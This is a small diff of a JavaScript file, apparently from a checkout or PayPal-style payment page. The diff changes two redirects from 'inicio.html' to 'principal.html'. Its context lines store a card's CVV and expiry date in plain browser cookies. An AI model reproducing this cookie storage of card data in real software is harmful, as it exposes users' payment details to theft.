@@ -9,7 +9,7 @@ function continue_button() {
     document.cookie = "cvv="+cvv;
     document.cookie = "caducidad="+caducidad;
 
-    window.location.href = "inicio.html"
+    window.location.href = "principal.html"
 }
 
 
@@ -46,5 +46,5 @@ function paypal() {
 }
 
 function gopaypal_button() {
-    window.location.href = "inicio.html"
+    window.location.href = "principal.html"
 }
